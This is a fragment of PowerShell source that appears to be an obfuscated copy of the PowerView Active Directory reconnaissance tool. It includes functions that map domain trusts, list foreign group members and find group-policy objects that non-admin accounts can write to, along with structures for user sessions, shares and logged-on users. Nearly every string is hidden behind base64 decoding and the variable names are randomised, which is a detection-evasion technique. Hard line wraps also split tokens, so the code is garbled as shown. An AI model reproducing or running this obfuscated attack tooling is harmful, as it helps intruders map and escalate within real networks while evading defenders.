[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) { ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
       
 if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UgBhAHcA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBhAHcA')))] = $Raw }
    }
    PROCESS {
        
${f985c973643f4a4f85599773a4c202cb} = @
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBzAGUAcgBzAA=='))), $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4AIABVAHMAZQByAHMA'))), 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwB1AGUAcwB0AHMA'))))
        Get-DomainGroup 
@ea43c787582f45539b7f519da4680c7a | Where-Object { 
${f985c973643f4a4f85599773a4c202cb} -notcontains $_.samaccountname } 
| ForEach-Object {
            $GroupName = $_.samAccountName
         
   ${1a3cd56a4c204515999fa720064e0a0e} = $_.distinguishedname
        
    ${e7b22e8963a14a049819cb0cd46c57ce} = 
${1a3cd56a4c204515999fa720064e0a0e}.SubString
(${1a3cd56a4c204515999fa720064e0a0e}.IndexOf
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
       
     $_.member | ForEach-Object {
                
${d8dc598e6a21422586826d41cd0f09cd} = $_.SubString($_.IndexOf
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
       
         if (($_ -match $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBOAD0AUwAtADEALQA1AC0AMgAxAC4AKgAtAC4AKgA=')))) -or 
(${e7b22e8963a14a049819cb0cd46c57ce} -ne 
${d8dc598e6a21422586826d41cd0f09cd})) {
                    
${4aa7fc7c696e412baa7f7dc79f9f6382} = $_
                    
${a89f2fde7acc4a6ca1ef8d25d1e1cb6f} = $_.Split(',')[0].split('=')
[1]
                    ${d2bcf26a5b164e688f97b612e750b78f} = New-
Object PSObject
                    
${d2bcf26a5b164e688f97b612e750b78f} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwByAG8AdQBwAEQAbwBtAGEAaQBuAA=='))) 
${e7b22e8963a14a049819cb0cd46c57ce}
                    
${d2bcf26a5b164e688f97b612e750b78f} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwByAG8AdQBwAE4AYQBtAGUA'))) $GroupName
                    
${d2bcf26a5b164e688f97b612e750b78f} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwByAG8AdQBwAEQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQATgBhAG0AZQA='))) 
${1a3cd56a4c204515999fa720064e0a0e}
                    
${d2bcf26a5b164e688f97b612e750b78f} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) 
${d8dc598e6a21422586826d41cd0f09cd}
                    
${d2bcf26a5b164e688f97b612e750b78f} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) 
${a89f2fde7acc4a6ca1ef8d25d1e1cb6f}
                    
${d2bcf26a5b164e688f97b612e750b78f} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQBlAG0AYgBlAHIARABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlAA==')
)) ${4aa7fc7c696e412baa7f7dc79f9f6382}
                    
${d2bcf26a5b164e688f97b612e750b78f}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBGAG8AcgBlAGkAZwBuAEcAcgBvAHUAcABNAGUAbQ
BiAGUAcgA='))))
                    
${d2bcf26a5b164e688f97b612e750b78f}
                }
            }
    
    }
    }
}
function Get-DomainTrustMapping {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType
('PowerView.DomainTrust.NET')]
    [OutputType
('PowerView.DomainTrust.LDAP')]
    [OutputType
('PowerView.DomainTrust.API')]
    [CmdletBinding
(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter
(ParameterSetName = 'API')]
        [Switch]
        $API,
        
[Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,
   
     [Parameter(ParameterSetName = 'LDAP')]
        
[ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
  
      $LDAPFilter,
        [Parameter(ParameterSetName = 'LDAP')]
     
   [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
  
      [Parameter(ParameterSetName = 'LDAP')]
        
[ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        
[String]
        $SearchBase,
        [Parameter(ParameterSetName = 
'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        
[ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        
[String]
        $Server,
        [Parameter(ParameterSetName = 
'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        
[String]
        $SearchScope = 'Subtree',
        [Parameter
(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        
[Int]
        $ResultPageSize = 200,
        [Parameter
(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        
[Int]
        $ServerTimeLimit,
        [Parameter(ParameterSetName = 
'LDAP')]
        [Switch]
        $Tombstone,
        [Parameter
(ParameterSetName = 'LDAP')]
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    
${ab0f8db44e254782b75e6bf3a5f33fd3} = @{}
    
${5c3104f4356949f7829a738ee4cf6410} = New-Object 
System.Collections.Stack
    ${8e7ae19c48884481ac4cfb490fdf9c86} = @
{}
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QQBQAEkA')))]) { 
${8e7ae19c48884481ac4cfb490fdf9c86}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBQAEkA')))] = $API }
    if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBFAFQA')))]) { ${8e7ae19c48884481ac4cfb490fdf9c86}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBFAFQA')))] = $NET }
    if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { 
${8e7ae19c48884481ac4cfb490fdf9c86}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
    if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { 
${8e7ae19c48884481ac4cfb490fdf9c86}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
    if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { 
${8e7ae19c48884481ac4cfb490fdf9c86}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
    if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${8e7ae19c48884481ac4cfb490fdf9c86}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
    if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${8e7ae19c48884481ac4cfb490fdf9c86}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
    if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${8e7ae19c48884481ac4cfb490fdf9c86}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
  if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${8e7ae19c48884481ac4cfb490fdf9c86}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${8e7ae19c48884481ac4cfb490fdf9c86}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
    if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${8e7ae19c48884481ac4cfb490fdf9c86}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
   
     ${050ab5c403f74fa2bb343425f45262ff} = (Get-Domain -Credential 
$Credential).Name
    }
    else {
        
${050ab5c403f74fa2bb343425f45262ff} = (Get-Domain).Name
    }
    
${5c3104f4356949f7829a738ee4cf6410}.Push
(${050ab5c403f74fa2bb343425f45262ff})
    while
(${5c3104f4356949f7829a738ee4cf6410}.Count -ne 0) {
        $Domain = 
${5c3104f4356949f7829a738ee4cf6410}.Pop()
        if ($Domain -and 
($Domain.Trim() -ne '') -and (-not 
${ab0f8db44e254782b75e6bf3a5f33fd3}.ContainsKey($Domain))) {
         
   Write-Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFQAcgB1AHMAdABNAGEAcABwAGkAbgBnAF0AIA
BFAG4AdQBtAGUAcgBhAHQAaQBuAGcAIAB0AHIAdQBzAHQAcwAgAGYAbwByACAAZABvAG
0AYQBpAG4AOgAgACcAJABEAG8AbQBhAGkAbgAnAA==')))
            $Null = 
${ab0f8db44e254782b75e6bf3a5f33fd3}.Add($Domain, '')
            try 
{
                ${8e7ae19c48884481ac4cfb490fdf9c86}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain
                
${40ad8af85c8149beb801bccc7849c761} = Get-DomainTrust 
@8e7ae19c48884481ac4cfb490fdf9c86
                if 
(${40ad8af85c8149beb801bccc7849c761} -isnot [System.Array]) {
        
            ${40ad8af85c8149beb801bccc7849c761} = @
(${40ad8af85c8149beb801bccc7849c761})
                }
               
 if ($PsCmdlet.ParameterSetName -eq 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBFAFQA')))) {
                    
${ab0c386f509d437e9c5b520281b38ed1} = @{}
                    if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { 
${ab0c386f509d437e9c5b520281b38ed1}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RgBvAHIAZQBzAHQA')))] = $Forest }
                    if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ab0c386f509d437e9c5b520281b38ed1}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                  
  ${40ad8af85c8149beb801bccc7849c761} += Get-ForestTrust 
@ab0c386f509d437e9c5b520281b38ed1
                }
                if 
(${40ad8af85c8149beb801bccc7849c761}) {
                    if 
(${40ad8af85c8149beb801bccc7849c761} -isnot [System.Array]) {
        
                ${40ad8af85c8149beb801bccc7849c761} = @
(${40ad8af85c8149beb801bccc7849c761})
                    }
           
         ForEach (${6b8afa8ebb5b442e99da73e7a2bbc3c6} in 
${40ad8af85c8149beb801bccc7849c761}) {
                        if 
(${6b8afa8ebb5b442e99da73e7a2bbc3c6}.SourceName -and 
${6b8afa8ebb5b442e99da73e7a2bbc3c6}.TargetName) {
                    
        $Null = ${5c3104f4356949f7829a738ee4cf6410}.Push
(${6b8afa8ebb5b442e99da73e7a2bbc3c6}.TargetName)
                     
       ${6b8afa8ebb5b442e99da73e7a2bbc3c6}
                        }
  
                  }
                }
            }
            catch 
{
                Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFQAcgB1AHMAdABNAGEAcABwAGkAbgBnAF0AIA
BFAHIAcgBvAHIAOgAgACQAXwA=')))
            }
        }
    }
}
function 
Get-GPODelegation {
    [CmdletBinding()]
    Param (
        [String]
  
      $GPOName = '*',
        [ValidateRange(1,10000)] 
        [Int]
  
      $PageSize = 200
    )
    ${ed578dadb6db4c6da2eae7336e3a8737} = 
@($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBZAFMAVABFAE0A'))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('RABvAG0AYQBpAG4AIABBAGQAbQBpAG4AcwA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RQBuAHQAZQByAHAAcgBpAHMAZQAgAEEAZABtAGkAbgBzAA=='))))
    $Forest = 
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest
()
    ${a703f20bf8564b339012f6a29cef094f} = @($Forest.Domains)
    
${5c3104f4356949f7829a738ee4cf6410} = 
${a703f20bf8564b339012f6a29cef094f} | foreach { 
$_.GetDirectoryEntry() }
    foreach ($Domain in 
${5c3104f4356949f7829a738ee4cf6410}) {
        $Filter = 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwAFAAbw
BsAGkAYwB5AEMAbwBuAHQAYQBpAG4AZQByACkAKABkAGkAcwBwAGwAYQB5AG4AYQBtAG
UAPQAkAEcAUABPAE4AYQBtAGUAKQApAA==')))
        
${148160fac3314bdc82ee9f4c583c0c4a} = New-Object 
System.DirectoryServices.DirectorySearcher
        
${148160fac3314bdc82ee9f4c583c0c4a}.SearchRoot = $Domain
        
${148160fac3314bdc82ee9f4c583c0c4a}.Filter = $Filter
        
${148160fac3314bdc82ee9f4c583c0c4a}.PageSize = $PageSize
        
${148160fac3314bdc82ee9f4c583c0c4a}.SearchScope = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwB1AGIAdAByAGUAZQA=')))
        
${a4aed0538fcf42f291912afaeb634de2} = 
${148160fac3314bdc82ee9f4c583c0c4a}.FindAll()
        foreach 
(${4c31ae76c0f64fb698a3074ad3ea5e60} in 
${a4aed0538fcf42f291912afaeb634de2}){
            
${3a28628adb834b7fb0df733dfd2a8fcb} = 
([ADSI]${4c31ae76c0f64fb698a3074ad3ea5e60}.path).ObjectSecurity.Acce
ss | ? {$_.ActiveDirectoryRights -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VwByAGkAdABlAA=='))) -and $_.AccessControlType -eq 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBsAGwAbwB3AA=='))) -and  ${ed578dadb6db4c6da2eae7336e3a8737} -
notcontains $_.IdentityReference.toString().split("\")[1] -and 
$_.IdentityReference -ne $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBSAEUAQQBUAE8AUgAgAE8AVwBOAEUAUgA=')))}
        if 
(${3a28628adb834b7fb0df733dfd2a8fcb} -ne $null){
            
${db3b56c34628466795b85043a29481a5} = New-Object psobject
            
${db3b56c34628466795b85043a29481a5} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBEAFMAUABhAHQAaAA='))) 
${4c31ae76c0f64fb698a3074ad3ea5e60}.Properties.adspath
            
${db3b56c34628466795b85043a29481a5} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) 
${4c31ae76c0f64fb698a3074ad3ea5e60}.Properties.displayname
           
 ${db3b56c34628466795b85043a29481a5} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAA=='))) 
${3a28628adb834b7fb0df733dfd2a8fcb}.IdentityReference
            
${db3b56c34628466795b85043a29481a5} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBjAHQAaQB2AGUARABpAHIAZQBjAHQAbwByAHkAUgBpAGcAaAB0AHMA'))) 
${3a28628adb834b7fb0df733dfd2a8fcb}.ActiveDirectoryRights
            
${db3b56c34628466795b85043a29481a5}
        }
        }
    }
}
${3afa1c61a8e041b1ab54c406175658af} = New-InMemoryModule -ModuleName 
Win32
${9fc62d3e16bf403bbb2b0af016b23f6b} = psenum 
${3afa1c61a8e041b1ab54c406175658af} PowerView.SamAccountTypeEnum 
UInt32 @{
    DOMAIN_OBJECT                   =   
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('MAB4ADAAMAAwADAAMAAwADAAMAA=')))
    GROUP_OBJECT                   
 =   $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADEAMAAwADAAMAAwADAAMAA=')))
    
NON_SECURITY_GROUP_OBJECT       =   
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('MAB4ADEAMAAwADAAMAAwADAAMQA=')))
    ALIAS_OBJECT                   
 =   $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADIAMAAwADAAMAAwADAAMAA=')))
    
NON_SECURITY_ALIAS_OBJECT       =   
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('MAB4ADIAMAAwADAAMAAwADAAMQA=')))
    USER_OBJECT                    
 =   $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADMAMAAwADAAMAAwADAAMAA=')))
    
MACHINE_ACCOUNT                 =   
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('MAB4ADMAMAAwADAAMAAwADAAMQA=')))
    TRUST_ACCOUNT                  
 =   $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADMAMAAwADAAMAAwADAAMgA=')))
    
APP_BASIC_GROUP                 =   
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('MAB4ADQAMAAwADAAMAAwADAAMAA=')))
    APP_QUERY_GROUP                
 =   $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADQAMAAwADAAMAAwADAAMQA=')))
    
ACCOUNT_TYPE_MAX                =   
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('MAB4ADcAZgBmAGYAZgBmAGYAZgA=')))
}
${c9d4141d47154d848e277e98f31bc056} = psenum 
${3afa1c61a8e041b1ab54c406175658af} PowerView.GroupTypeEnum UInt32 
@{
    CREATED_BY_SYSTEM               =   
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('MAB4ADAAMAAwADAAMAAwADAAMQA=')))
    GLOBAL_SCOPE                   
 =   $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMgA=')))
    
DOMAIN_LOCAL_SCOPE              =   
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('MAB4ADAAMAAwADAAMAAwADAANAA=')))
    UNIVERSAL_SCOPE                
 =   $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAOAA=')))
    
APP_BASIC                       =   
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('MAB4ADAAMAAwADAAMAAwADEAMAA=')))
    APP_QUERY                      
 =   $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADIAMAA=')))
    
SECURITY                        =   
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('MAB4ADgAMAAwADAAMAAwADAAMAA=')))
} -Bitfield
${9ad57110e7184c649f993e0b08059b53} = psenum 
${3afa1c61a8e041b1ab54c406175658af} PowerView.UACEnum UInt32 @{
    
SCRIPT                          =   1
    ACCOUNTDISABLE              
    =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT        
                 =   16
    PASSWD_NOTREQD                  =   32
    
PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED 
     =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    
NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT 
      =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    
SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD     
       =   65536
    MNS_LOGON_ACCOUNT               =   131072
    
SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION 
         =   524288
    NOT_DELEGATED                   =   1048576
   
 USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH     
           =   4194304
    PASSWORD_EXPIRED                =   
8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    
PARTIAL_SECRETS_ACCOUNT         =   67108864
} -Bitfield
${588c7fadeed643fcafcc6767cd38de5b} = psenum 
${3afa1c61a8e041b1ab54c406175658af} WTS_CONNECTSTATE_CLASS UInt16 @
{
    Active       =    0
    Connected    =    1
    ConnectQuery =    
2
    Shadow       =    3
    Disconnected =    4
    Idle         =    
5
    Listen       =    6
    Reset        =    7
    Down         =    
8
    Init         =    9
}
${8078b828c51c4adbae041b90a3bc67e4} = 
struct ${3afa1c61a8e041b1ab54c406175658af} PowerView.RDPSessionInfo 
@{
    ExecEnvId = field 0 UInt32
    State = field 1 
${588c7fadeed643fcafcc6767cd38de5b}
    SessionId = field 2 UInt32
    
pSessionName = field 3 String -MarshalAs @
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABQAFcAUwB0AHIA'))))
    pHostName = field 4 String -MarshalAs @
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABQAFcAUwB0AHIA'))))
    pUserName = field 5 String -MarshalAs @
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABQAFcAUwB0AHIA'))))
    pDomainName = field 6 String -MarshalAs 
@($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABQAFcAUwB0AHIA'))))
    pFarmName = field 7 String -MarshalAs @
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABQAFcAUwB0AHIA'))))
}
${bd6637eacee942fd9576e56a6f2cc642} = struct 
${3afa1c61a8e041b1ab54c406175658af} WTS_CLIENT_ADDRESS @{
    
AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -
MarshalAs @($([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QgB5AFYAYQBsAEEAcgByAGEAeQA='))), 20)
}
${505cfd894b7744429f33666610c70105} = struct 
${3afa1c61a8e041b1ab54c406175658af} PowerView.ShareInfo @{
    Name = 
field 0 String -MarshalAs @($([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    Type = field 
1 UInt32
    Remark = field 2 String -MarshalAs @
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABQAFcAUwB0AHIA'))))
}
${036bdd421285436982caee874d80a0d5} = struct 
${3afa1c61a8e041b1ab54c406175658af} PowerView.LoggedOnUserInfo @{
    
UserName = field 0 String -MarshalAs @
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABQAFcAUwB0AHIA'))))
    LogonDomain = field 1 String -MarshalAs 
@($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABQAFcAUwB0AHIA'))))
    AuthDomains = field 2 String -MarshalAs 
@($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABQAFcAUwB0AHIA'))))
    LogonServer = field 3 String -MarshalAs 
@($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABQAFcAUwB0AHIA'))))
}
${164040aeb62f4c148652befe6bcab782} = struct 
${3afa1c61a8e041b1ab54c406175658af} PowerView.SessionInfo @{
    
CName = field 0 String -MarshalAs @
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABQAFcAUwB0AHIA'))))
    UserName = field 1 String -MarshalAs @
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABQAFcAUwB0AHIA'))))
    Time = field 2 UInt32
    IdleTime = field 
3 UInt32
}
${4d7585e5ad8744299564635d9f0eba1a} = psenum 
${3afa1c61a8e041b1ab54c406175658af} SID_NAME_USE UInt16 @{
    
SidTypeUser             = 1
    SidTypeGroup            = 2
    
SidTypeDomain           = 3
    SidTypeAlias            = 4
    
SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    
